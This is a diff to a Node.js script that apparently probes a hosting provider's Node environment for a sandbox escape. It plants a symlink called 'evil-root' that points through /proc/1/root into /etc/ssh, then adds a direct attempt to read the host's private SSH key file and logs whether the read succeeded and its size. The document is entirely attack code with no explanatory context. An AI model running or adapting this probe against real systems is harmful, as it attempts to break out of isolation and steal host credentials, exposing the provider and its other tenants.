@@ -2,7 +2,7 @@ import fs from "node:fs";
 import path from "node:path";
 import { spawn } from "node:child_process";
 
-const marker = "HOSTINGER_NODE_FILE_LOG_WATCH_TOCTOU_GATE:r223";
+const marker = "HOSTINGER_NODE_SSH_LOG_WATCH_TOCTOU_GATE:r224";
 const output = path.resolve("dist");
 const alternate = path.resolve("evil-root");
 const versionsRoot = path.resolve(process.cwd(), "..", "..", "versions");
@@ -11,7 +11,7 @@ fs.rmSync(alternate, { recursive: true, force: true });
 fs.mkdirSync(output, { recursive: true });
 fs.writeFileSync(path.join(output, "control.txt"), `${marker}:894a8b0f9abe4351\n`, { mode: 0o600 });
 
-const hiddenTarget = "../../../../../../../proc/1/root/usr/sbin/proxyexec";
+const hiddenTarget = "../../../../../../../proc/1/root/etc/ssh";
 let hiddenLink;
 try {
   fs.symlinkSync(hiddenTarget, alternate);
@@ -26,6 +26,14 @@ try {
   directRead = { readable: true, bytes: body.length };
 } catch (error) {
   directRead = { readable: false, errorCode: error.code ?? error.name };
+}
+
+let exactTargetProbe;
+try {
+  const body = fs.readFileSync("/proc/1/root/etc/ssh/ssh_host_ed25519_key");
+  exactTargetProbe = { readable: true, bytes: body.length };
+} catch (error) {
+  exactTargetProbe = { readable: false, errorCode: error.code ?? error.name };
 }
 
 const outputStat = fs.statSync(output);
@@ -58,6 +66,7 @@ try {
 console.log(JSON.stringify({
   marker,
   directRead,
+  exactTargetProbe,
   hiddenLink,
   versionsWatch,
   safeOutput: {
